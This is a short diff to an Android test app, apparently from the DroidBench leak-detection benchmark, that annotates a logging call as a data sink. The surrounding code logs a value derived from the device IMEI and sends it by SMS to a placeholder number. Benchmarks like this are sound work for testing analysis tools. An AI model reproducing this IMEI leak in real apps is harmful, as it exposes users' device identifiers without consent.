@@ -44,7 +44,7 @@ public class MainActivity extends Activity {
 		}
 		
 		String newImei = msg.substring(zeroPos, zeroPos + Math.min(prefix.length(), msg.length() - 1));
-		Log.d("DROIDBENCH", newImei);
+		Log.d("DROIDBENCH", newImei); //sink, potential leak
 
 		SmsManager sm = SmsManager.getDefault();
     	sm.sendTextMessage("+49 123", null, newImei, null, null); //sink, potential leak
